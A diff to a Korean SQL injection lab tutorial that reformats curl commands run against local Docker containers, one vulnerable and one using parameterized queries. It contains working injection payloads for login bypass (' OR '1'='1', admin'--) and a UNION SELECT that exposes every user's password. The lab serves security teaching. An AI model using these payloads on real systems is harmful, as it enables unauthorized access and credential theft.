@@ -65,15 +65,13 @@ SELECT * FROM users WHERE username = 'admin'
 - admin 사용자가 존재하면 즉시 인증 통과
 
 ### 실습 과정
-```bash
+```powershell
 # 1. 취약한 버전 테스트
-curl.exe -X POST http://localhost:5001/login \
-  -d "username=admin'--&password=anything"
+curl.exe -X POST http://localhost:5001/login -d "username=admin'--&password=anything"
 # 결과: 로그인 성공 (비밀번호 우회)
 
 # 2. 안전한 버전 테스트
-curl.exe -X POST http://localhost:5002/login \
-  -d "username=admin'--&password=anything"
+curl.exe -X POST http://localhost:5002/login -d "username=admin'--&password=anything"
 # 결과: 로그인 실패 (Parameterized Query로 방어)
 ```
 
@@ -226,18 +224,15 @@ cd ch04-sql-injection
 docker-compose up -d
 
 # 취약한 버전 - Authentication Bypass (OR 1=1)
-curl.exe -X POST http://localhost:5001/login \
-  -d "username=' OR '1'='1' --&password=anything"
+curl.exe -X POST http://localhost:5001/login -d "username=' OR '1'='1' --&password=anything"
 # 결과: 로그인 성공
 
 # 취약한 버전 - SQL Comment Injection (admin'-- 페이로드)
-curl.exe -X POST http://localhost:5001/login \
-  -d "username=admin'--&password=anything"
+curl.exe -X POST http://localhost:5001/login -d "username=admin'--&password=anything"
 # 결과: admin 계정으로 로그인 성공 (비밀번호 우회)
 
 # 취약한 버전 - 다른 사용자로 주석 우회
-curl.exe -X POST http://localhost:5001/login \
-  -d "username=alice'--&password=wrong"
+curl.exe -X POST http://localhost:5001/login -d "username=alice'--&password=wrong"
 # 결과: alice 계정으로 로그인 성공
 
 # 취약한 버전 - UNION Injection
@@ -245,13 +240,11 @@ curl.exe "http://localhost:5001/search?q=' UNION SELECT id, username, password F
 # 결과: 모든 사용자의 비밀번호 노출
 
 # 안전한 버전 - Authentication Bypass 차단
-curl.exe -X POST http://localhost:5002/login \
-  -d "username=' OR '1'='1' --&password=anything"
+curl.exe -X POST http://localhost:5002/login -d "username=' OR '1'='1' --&password=anything"
 # 결과: 로그인 실패
 
 # 안전한 버전 - SQL Comment Injection 차단
-curl.exe -X POST http://localhost:5002/login \
-  -d "username=admin'--&password=anything"
+curl.exe -X POST http://localhost:5002/login -d "username=admin'--&password=anything"
 # 결과: 로그인 실패 (Parameterized Query로 방어)
 
 docker-compose down
